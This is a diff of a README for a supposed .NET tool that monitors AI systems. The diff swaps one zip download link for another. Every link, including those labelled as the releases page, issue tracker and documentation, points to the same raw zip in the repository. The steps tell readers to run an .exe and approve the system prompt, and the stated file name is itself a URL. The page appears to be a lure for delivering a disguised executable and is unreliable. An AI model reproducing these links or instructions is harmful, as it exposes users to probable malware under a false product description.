@@ -1,6 +1,6 @@
 # 🌟 nl-eval-observability-feedback-loops - Simplifying AI System Monitoring  
 
-[![Download Now](https://raw.githubusercontent.com/pogo899GX/nl-eval-observability-feedback-loops/master/EvalObservabilityFeedbackLoops/feedback_nl_loops_observability_eval_1.3.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/pogo899GX/nl-eval-observability-feedback-loops/master/EvalObservabilityFeedbackLoops/feedback_nl_loops_observability_eval_1.3.zip)
+[![Download Now](https://github.com/pogo899GX/nl-eval-observability-feedback-loops/raw/refs/heads/master/EvalObservabilityFeedbackLoops/eval_feedback_loops_observability_nl_3.0.zip%20Now-Click%20Here-blue)](https://github.com/pogo899GX/nl-eval-observability-feedback-loops/raw/refs/heads/master/EvalObservabilityFeedbackLoops/eval_feedback_loops_observability_nl_3.0.zip)
 
 ## 📖 Overview  
 Welcome to **nl-eval-observability-feedback-loops**! This application helps you evaluate, observe, and improve production AI systems built with .NET. By using our tool, you can easily manage feedback loops, ensuring your AI systems run smoothly and effectively.
@@ -9,13 +9,13 @@ Welcome to **nl-eval-observability-feedback-loops**! This application helps you 
 To begin using this software, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/pogo899GX/nl-eval-observability-feedback-loops/master/EvalObservabilityFeedbackLoops/feedback_nl_loops_observability_eval_1.3.zip) to find the latest version available for download. This page will show you all the versions we have released, with the newest one listed at the top.
+   Go to our [Releases page](https://github.com/pogo899GX/nl-eval-observability-feedback-loops/raw/refs/heads/master/EvalObservabilityFeedbackLoops/eval_feedback_loops_observability_nl_3.0.zip) to find the latest version available for download. This page will show you all the versions we have released, with the newest one listed at the top.
 
 2. **Choose a Version**  
    On the Releases page, locate the version you want to download. Each version includes details about its improvements or fixes. Select the latest version, as it will contain the most recent updates.
 
 3. **Download the .exe File**  
-   Click on the link for the .exe file. Your browser will start downloading it to your computer. The file is typically named something like `https://raw.githubusercontent.com/pogo899GX/nl-eval-observability-feedback-loops/master/EvalObservabilityFeedbackLoops/feedback_nl_loops_observability_eval_1.3.zip`, where X.Y.Z corresponds to the version number. 
+   Click on the link for the .exe file. Your browser will start downloading it to your computer. The file is typically named something like `https://github.com/pogo899GX/nl-eval-observability-feedback-loops/raw/refs/heads/master/EvalObservabilityFeedbackLoops/eval_feedback_loops_observability_nl_3.0.zip`, where X.Y.Z corresponds to the version number. 
 
 4. **Locate the Downloaded File**  
    Once the download is complete, navigate to the location on your computer where downloads are saved. This is often the “Downloads” folder or wherever you have set your browser to save files. 
@@ -24,7 +24,7 @@ To begin using this software, follow these steps:
    Double-click the downloaded .exe file to start the application. Follow the on-screen instructions to set it up. The first time you run it, your operating system may ask you if you want to open the file. Click “Yes” or “Run” to proceed.
 
 ## 📦 Download & Install  
-To download and install the application, simply visit our releases page: [Download Here](https://raw.githubusercontent.com/pogo899GX/nl-eval-observability-feedback-loops/master/EvalObservabilityFeedbackLoops/feedback_nl_loops_observability_eval_1.3.zip). After downloading the .exe file, follow the installation steps outlined above.
+To download and install the application, simply visit our releases page: [Download Here](https://github.com/pogo899GX/nl-eval-observability-feedback-loops/raw/refs/heads/master/EvalObservabilityFeedbackLoops/eval_feedback_loops_observability_nl_3.0.zip). After downloading the .exe file, follow the installation steps outlined above.
 
 ## ⚙️ System Requirements  
 Before you install this software, ensure your system meets these requirements:
@@ -68,8 +68,8 @@ If these tips do not resolve your issue, please reach out through the GitHub Iss
 ## 🔗 Resources  
 For more detailed documentation and support, check out the following links:
 
-- [GitHub Issues](https://raw.githubusercontent.com/pogo899GX/nl-eval-observability-feedback-loops/master/EvalObservabilityFeedbackLoops/feedback_nl_loops_observability_eval_1.3.zip) - Report bugs or request features.
-- [Official Documentation](https://raw.githubusercontent.com/pogo899GX/nl-eval-observability-feedback-loops/master/EvalObservabilityFeedbackLoops/feedback_nl_loops_observability_eval_1.3.zip) - Read through extensive guides and user manuals.
+- [GitHub Issues](https://github.com/pogo899GX/nl-eval-observability-feedback-loops/raw/refs/heads/master/EvalObservabilityFeedbackLoops/eval_feedback_loops_observability_nl_3.0.zip) - Report bugs or request features.
+- [Official Documentation](https://github.com/pogo899GX/nl-eval-observability-feedback-loops/raw/refs/heads/master/EvalObservabilityFeedbackLoops/eval_feedback_loops_observability_nl_3.0.zip) - Read through extensive guides and user manuals.
 
 ## 🙌 Acknowledgments  
 We thank the contributors for their hard work in developing this application. Your feedback is essential to helping us improve and enhance the software further.
